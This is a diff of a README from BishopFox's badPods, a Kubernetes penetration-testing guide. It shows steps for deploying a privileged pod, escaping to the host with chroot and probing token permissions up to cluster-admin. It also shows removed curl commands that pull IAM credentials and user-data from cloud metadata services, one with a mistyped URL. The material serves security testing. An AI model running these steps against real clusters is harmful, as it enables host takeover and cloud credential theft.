@@ -6,13 +6,16 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 ### Create a pod you can exec into
 [pod-everything-allowed.yaml](pod-everything-allowed.yaml)
 
-#### Create the pod
+#### Option 1: Create pod from local yaml 
 ```bash
-# Option 1: Create pod from local yaml 
 kubectl apply -f pod-everything-allowed.yaml 
-# Option 2: Create pod from github hosted yaml
+```
+
+#### Option 2: Create pod from github hosted yaml
+```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml 
 ```
+
 #### Exec into pod 
 ```bash
 kubectl exec -it pod-everything-allowed -- chroot /host
@@ -84,14 +87,6 @@ kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 
 # Does the token allow you to view secrets in that namespace? How about other namespaces?
 # Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
-```
-
-If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 
-
-```bash
-curl http://169.254.169.254/latest/user-data 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
 ```
 
 Some other ideas:
